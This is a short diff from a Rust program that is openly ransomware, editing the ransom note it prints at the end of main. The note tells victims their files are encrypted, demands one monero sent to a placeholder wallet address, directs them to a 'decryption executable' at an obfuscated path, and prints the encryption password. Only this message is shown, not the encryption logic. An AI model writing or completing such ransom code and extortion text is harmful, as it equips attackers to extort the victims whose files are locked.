@@ -177,8 +177,10 @@ fn main() {
         eprintln!("Error: {}", err);
         std::process::exit(1);
     }
-    println!("Your computer has been infected with ransomware, you cannot retreive your files.
-    \nWe will return them to you if you send one monero to this address\n
-    [PLACEHOLDER] \n
-    or just download the decryption executable from VTJ0cGJ/ransomwr\npassword = {}", password)
+    println!("Your computer has been infected with ransomware, you cannot retreive your files.\n
+    We will return them to you if you send one monero to this address.\n
+    [PLACEHOLDER]\n
+    or just download the decryption executable from VTJ0cGJ/ransomwr.\n
+    the password used for encryption is below.\n
+    password = {}", password)
 }
